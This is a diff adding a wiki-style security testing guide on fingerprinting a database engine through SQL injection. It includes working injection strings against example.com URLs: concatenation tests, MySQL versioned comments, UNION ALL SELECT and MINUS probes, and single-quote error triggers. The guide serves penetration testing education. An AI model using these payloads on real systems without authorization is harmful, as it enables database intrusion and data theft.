@@ -1,0 +1,207 @@
+= Overview =
+
+To furthermore exploit SQL Injection vulnerability you need to know
+what kind of Database Engine your web application is using. 
+There are a few techniques to accomplish this task:
+   * Banner Grabbing
+   * Guessing the string concatenation operator
+   * Analyzing backend SQL Dialect
+   * Error Code Analysis
+
+= Description =
+
+After determining that a web application is vulnerable to SQL Injection we need to fingerprint backend DBMS
+to furthermore exploit such a vulnerbility. Fingerprint is performed against a set of peculiarities of DBMS.
+Such a peculiarities are listed below in order of accuracy:
+
+* Informations exposed through an error code
+* String concatenation functions
+* SQL Dialects
+
+
+== Banner Grabbing ==
+
+Through a SQL Injection we can retrieve Backend DBMS banner but be aware that it could have been replaced by a system administrator. Such a SQL Injection shall include a SQL Statement to be evaluated. Let'see how to accomplish this task:
+* MySQL: ''SELECT version()''
+* Postgres: ''SELECT version()''
+* Oracle: ''SELECT version FROM v$instance''
+* MS SQL: ''SELECT @@version''
+
+== Fingerprinting with string concatenation ==
+
+Different DBMS handle string concatenation with different operators:
+
+
+'''MS SQL''':   'a' + 'a'
+
+'''MySQL''':    CONCAT('a','a')
+
+'''Oracle''':   'a' || 'a' ''or''  CONCAT('a','a')
+
+'''Postgres''': 'a' || 'a'
+
+
+As you can see both Oracle and Postgres use the || operator to perform
+such a concatenation, so we need another difference to distinguish them.
+
+PL/SQL define the CONCAT operator as well  to perform string concatenation
+and as you can guess this one is not defined on Postgres.
+
+
+'''Example:'''
+
+Let say you're testing the following URL: <nowiki>http://www.example.com/news.php?id=1</nowiki>
+
+You checked that the above URL is vulnerable to a Blind SQL Injection.
+It means that <nowiki>http://www.example.com/news.php</nowiki>  return back
+the same contents with both 
+
+id=1 (<nowiki>http://www.example.com/news.php?id=1</nowiki>)
+
+''and''
+
+id=1 AND 1=1 (<nowiki>http://www.example.com/news.php?id=1 AND 1=1</nowiki>)
+
+
+
+You know that different engine have different operators
+to perform string concatenation as well so all you have to do is 
+to compare the orginal page (id=1) with:
+
+* '''MSSQL:''' id=1 AND 'aa'='a'+'a'        
+* '''MySQL/Oracle:''' id=1 AND 'aa'=CONCAT('a','a')  
+* '''Oracle/Postgres:''' id=1 AND 'a'='a'||'a'         
+
+
+'''MS SQL''':
+
+The following comparison should be true:
+* <nowiki>http://www.example.com/news.php?id=1''</nowiki>
+* <nowiki>http://www.example.com/news.php?id=1 AND 'aa'='a'+'a'''</nowiki>
+
+'''MySQL''':
+
+The following comparison should be true:
+* <nowiki>http://www.example.com/news.php?id=1</nowiki>
+* <nowiki>http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')</nowiki>
+
+'''Oracle''':
+
+The following comparison should be true:
+* <nowiki>http://www.example.com/news.php?id=1</nowiki>
+* <nowiki>http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')</nowiki>
+* <nowiki>http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'</nowiki>
+
+'''Postgres''':
+
+The following comparison should be true:
+* <nowiki>http://www.example.com/news.php?id=1</nowiki>
+* <nowiki>http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'</nowiki>
+
+
+== Fingerprinting through SQL Dialect Injection ==
+
+Each DBMS extends Standard SQL with a set of native statements. Such a set define a SQL Dialect available to developers
+to properly query a backend DBMS Engine. Beside of a lack of portability this flaw dafine a way to accurately fingerprint
+a DBMS through a SQL Injection, or even better a SQL Dialect Injection. SQL Dialect Injection is an attack vector where only statements, operators and peculiarities of a SQL Dialect are used in a SQL Injection.
+
+As an example what does ''SELECT 1/0'' returns on different DBMS?
+
+* '''MySQL:''' NULL
+* '''Postgres:''' ERROR:  division by zero
+* '''Oracle:''' ORA-00923: FROM keyword not found where expected
+* '''SQL Server:''' Server: Msg 8134, Level 16, State 1, Line 1 Divide by zero error encountered.
+
+We can exploit this peculiarities to identify MySQL DBMS. To accomplish this task the following comparison shall be true:
+
+ <nowiki>
+http://www.example.com/news.php?id=1 
+http://www.example.com/news.php?id=1 AND ISNULL(1/0)
+</nowiki>
+
+
+Let see more about this fingerprinting technique.
+
+
+'''MySQL:'''
+
+One of MySQL peculiarities is that when a comment block ('/**/') contains an exlamation mark ('/*! sql here*/') it is interpreted by MySQL, and is considered as a normal comment block by other DBMS.
+
+So, if you determine that ''<nowiki>http://www.example.com/news.php?id=1</nowiki>'' is vulnerable
+to a BLIND SQL Injection the following comparison should be '''TRUE'':
+
+  <nowiki>http://www.example.com/news.php?id=1</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 AND 1=1--</nowiki>
+
+When backend engine is MySQL following WEB PAGES should contains the same content of vulnerable URL
+  <nowiki>http://www.example.com/news.php?id=1 /*! AND 1=1 */--</nowiki>
+
+on the other side the following should be completely different:
+  <nowiki>http://www.example.com/news.php?id=1 /*! AND 1=0 */--</nowiki>
+
+
+'''PostgreSQL:'''
+
+Postgres define the ''::'' operator to perform data casting. It means that ''1'' as INT
+can be convert to ''1'' as CHAR with the following statements:
+
+  SELECT 1::CHAR
+
+
+So, if you determine that ''<nowiki>http://www.example.com/news.php?id=1</nowiki>'' is vulnerable
+to a BLIND SQL Injection the following comparison should be true when backend engine is PostgreSQL:
+
+  <nowiki>http://www.example.com/news.php?id=1</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 AND 1=1::int</nowiki>
+
+'''MS SQL Server:'''
+T-SQL adds ''TOP'' expression for ''SELECT'' statements in order to upper limit retrieved result set:
+
+  SELECT TOP 10 FROM news
+
+The following comparison should be true on MS SQL:
+
+  <nowiki>http://www.example.com/news.php?id=1</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 UNION ALL SELECT TOP 1 NULL,NULL </nowiki>
+
+
+'''Oracle:'''
+
+Oracle implements the following set operators:
+ * UNION 
+ * UNION ALL
+ * INTERSECT
+ * MINUS
+
+''MINUS'' has not yet been implemented on other DBMS so we can inject it to see if it get executed by backend database with no errors at all.
+* /news.php?id=1 is vulnerable to SQL Injection
+* through UNION SQL INJECTION we determine how many expression are retrieved from ''news.php'' to the backend DBMS
+* replace UNION with MINUS to see if you get back original page (/news.php?id=1)
+
+  <nowiki>http://www.example.com/news.php?id=1</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 UNION ALL SELECT NULL FROM DUAL</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL FROM DUAL</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL,NULL FROM DUAL</nowiki>
+  <nowiki>http://www.example.com/news.php?id=1 MINUS SELECT NULL,NULL,NULL FROM DUAL</nowiki>
+
+== Error Codes Analysis ==
+
+By performing fault injection, or fuzzing, you can gather important 
+information through error code analysis when web application framework reports errors.
+Let'see some examples:
+
+ <nowiki>
+http://www.example.com/store/findproduct.php?name='
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version 
+for the right syntax to use near '''''   at line 1</nowiki>
+
+ <nowiki>
+http://www.example.com/store/products.php?id='
+
+Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: unterminated quoted string at or near "'" LINE 1: 
+SELECT * FROM products WHERE ID=' ^ in /var/www/store/products.php on line 9</nowiki>
+
+= References =
+
+Victor Chapela: "Advanced SQL Injection" http://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt
